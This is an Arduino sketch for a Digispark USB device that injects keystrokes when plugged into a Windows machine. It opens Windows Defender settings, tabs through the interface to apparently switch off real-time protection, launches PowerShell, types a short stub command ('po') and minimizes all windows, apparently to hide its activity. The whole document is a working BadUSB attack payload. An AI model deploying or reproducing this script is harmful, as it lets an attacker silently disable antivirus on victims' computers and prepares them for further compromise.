
#include "DigiKeyboard.h"

void setup() {
     pinMode(0, OUTPUT);
   

    digitalWrite(1, HIGH); 
    delay(200);          
    
    delay(200);
    
    DigiKeyboard.sendKeyStroke(0);
    digitalWrite(1, HIGH); 

    DigiKeyboard.delay(2500);
    DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
    DigiKeyboard.delay(1100);
    DigiKeyboard.print("ms-settings:windowsdefender");
    DigiKeyboard.delay(150);
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(3700);
    DigiKeyboard.sendKeyStroke(43); 
    DigiKeyboard.delay(8);
    DigiKeyboard.sendKeyStroke(43); 
    DigiKeyboard.delay(8);
    DigiKeyboard.sendKeyStroke(43);  
    DigiKeyboard.delay(8);
    DigiKeyboard.sendKeyStroke(43); 
    DigiKeyboard.delay(8);
    DigiKeyboard.sendKeyStroke(43);  
    DigiKeyboard.delay(8);
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(3009);

    

    DigiKeyboard.sendKeyStroke(43); 
    DigiKeyboard.delay(80);
    DigiKeyboard.sendKeyStroke(43); 
    DigiKeyboard.delay(80);
    DigiKeyboard.sendKeyStroke(43);  
    DigiKeyboard.delay(80);
    DigiKeyboard.sendKeyStroke(43); 
    DigiKeyboard.delay(80);
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(500);
    DigiKeyboard.sendKeyStroke(KEY_SPACE);
    DigiKeyboard.delay(900);
    DigiKeyboard.sendKeyStroke(43); 
    DigiKeyboard.delay(80);
    DigiKeyboard.sendKeyStroke(43); 
    DigiKeyboard.delay(80);
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(2400);


    DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
    DigiKeyboard.delay(1000);
    DigiKeyboard.print("powershell");
    DigiKeyboard.delay(1000);
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(3766);

    DigiKeyboard.print("po");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.sendKeyStroke(KEY_M, MOD_GUI_LEFT);
}
void loop() {
  digitalWrite(1, HIGH); 
  delay(200);          
  digitalWrite(1, LOW);  
  delay(200);
}









 

